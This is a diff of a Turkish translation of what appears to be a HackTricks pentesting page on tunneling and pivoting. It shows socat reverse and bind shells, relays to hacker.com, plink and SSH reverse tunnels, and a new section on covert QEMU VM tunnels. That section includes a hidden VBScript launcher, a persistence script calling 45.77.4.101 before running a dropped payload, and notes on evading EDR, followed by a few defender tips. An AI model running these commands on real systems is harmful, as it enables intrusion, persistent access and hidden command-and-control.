@@ -5,7 +5,7 @@
 ## Nmap ipucu
 
 > [!WARNING]
-> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramaları** (`-sT`) belirtmeliyiz.
+> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramalarını** (`-sT`) belirtmeliyiz.
 
 ## **Bash**
 
@@ -93,8 +93,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik**i bir **alt ağa** **tünelleme** yapabilirsiniz.\
-Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek.
+Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik** için bir **alt ağ** üzerinden **tünel** oluşturabilirsiniz.\
+Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -178,7 +178,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinin sürümler sayfasından indirebilirsiniz.\
+Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki sürümler sayfasından indirebilirsiniz.\
 **İstemci ve sunucu için aynı sürümü kullanmalısınız.**
 
 ### socks
@@ -241,7 +241,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Ters tünel. Tünel, kurban tarafından başlatılır.\
+Ters tünel. Tünel kurban tarafından başlatılır.\
 127.0.0.1:1080 adresinde bir socks4 proxy oluşturulur.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -267,7 +267,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Ters kabuk
+### Ters shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son satırın yerine bu satırı çalıştırarak atlayabilirsiniz:
+**Kimlik doğrulaması yapılmamış bir proxy'yi** atlamak için, kurbanın konsolundaki son satırın yerine bu satırı çalıştırabilirsiniz:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Yerel SSH portunu (22) saldırgan ana bilgisayarın 443 portuna bağlayın
+Yerel SSH portunu (22) saldırgan ana bilgisayarın 443 portuna bağlayın.
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).
+Konsol PuTTY versiyonu gibidir (seçenekler bir ssh istemcisine çok benzer).
 
-Bu ikili dosya kurban üzerinde çalıştırılacağı için ve bir ssh istemcisi olduğu için, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
+Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -360,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız ve bu **127.0.0.1:1080** adresinde **dinleyecektir**.
 
-**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikilisini yükleyip çalıştırın:
+**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -396,12 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
+Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
-Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoft tarafından oluşturulan bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tünelleme
 
@@ -532,7 +532,7 @@ Stdout'tan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000
 3 tünel açar:
 
 - 2 TCP
-- 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sergilenmesiyle
+- 1 HTTP, /tmp/httpbin/ dizininden statik dosya sergilemesi ile
 ```yaml
 tunnels:
 mytcp:
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tüneli)
 
-Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir; bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
+Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir ve bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
 
 ### Hızlı tünel tek satır komutu
 ```bash
@@ -574,11 +574,11 @@ Bağlayıcıyı başlatın:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Çünkü tüm trafik ana bilgisayardan **443 üzerinden çıkış yapar**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İlgili ikilinin genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
+Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İkili dosyanın genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
 
 ## FRP (Hızlı Ters Proxy)
 
-[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir ikili gerekmemektedir.
+[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak hareket edebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak bir ters tünel açabilir – ek bir ikili dosyaya gerek yoktur.
 
 ### Klasik ters TCP tüneli
 ```bash
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Yukarıdaki komut, kurbanın **8080** portunu **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir.
+Yukarıdaki komut, kurbanın portunu **8080** olarak **attacker_ip:9000** şeklinde yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir.
+
+## QEMU ile Gizli VM Tünelleri
+
+QEMU’nun kullanıcı modu ağı (`-netdev user`), *host* üzerinde bir TCP/UDP portunu **bağlayan** ve bunu *guest* içine yönlendiren `hostfwd` adlı bir seçeneği destekler. Misafir tam bir SSH daemon'u çalıştırdığında, hostfwd kuralı, tamamen geçici bir VM içinde yaşayan, atılabilir bir SSH jump box sağlar – tüm kötü niyetli etkinlik ve dosyaların sanal disk içinde kalması nedeniyle EDR'den C2 trafiğini gizlemek için mükemmeldir.
+
+### Hızlı bir satırlık
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Yukarıdaki komut, RAM'de bir **Tiny Core Linux** imajı (`tc.qcow2`) başlatır.  
+• Windows ana bilgisayarındaki **2222/tcp** portu, misafir içinde **22/tcp**'ye şeffaf bir şekilde yönlendirilir.  
+• Saldırganın bakış açısından hedef, basitçe 2222 portunu açar; ona ulaşan herhangi bir paket, VM'de çalışan SSH sunucusu tarafından işlenir.  
+
+### VBScript ile gizlice başlatma
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+`cscript.exe //B update.vbs` komutunu çalıştırmak pencereyi gizli tutar.
+
+### Misafir içinde kalıcılık
+
+Tiny Core durumdan bağımsız olduğu için, saldırganlar genellikle:
+
+1. Yükü `/opt/123.out` konumuna bırakır.
+2. `/opt/bootlocal.sh` dosyasına ekler:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Yükün kapanışta `mydata.tgz` içine paketlenmesi için `home/tc` ve `opt`'yi `/opt/filetool.lst` dosyasına ekler.
+
+### Bunun tespiti nasıl atlatıyor
+
+• Sadece iki imzasız yürütülebilir dosya (`qemu-system-*.exe`) diske dokunur; hiçbir sürücü veya hizmet yüklenmez.
+• Ana makinedeki güvenlik ürünleri **zararsız döngü geri dönüş trafiği** görür (gerçek C2 VM içinde sonlanır).
+• Bellek tarayıcıları, farklı bir işletim sisteminde yaşadığı için kötü amaçlı süreç alanını asla analiz etmez.
+
+### Defender ipuçları
+
+• Kullanıcı yazılabilir yollarında **beklenmedik QEMU/VirtualBox/KVM ikili dosyaları** için uyarı verin.
+• `qemu-system*.exe`'den kaynaklanan çıkış bağlantılarını engelleyin.
+• QEMU başlatıldıktan hemen sonra bağlanan nadir dinleme portlarını (2222, 10022, …) araştırın.
+
+---
 
 ## Kontrol edilecek diğer araçlar
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Referanslar
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
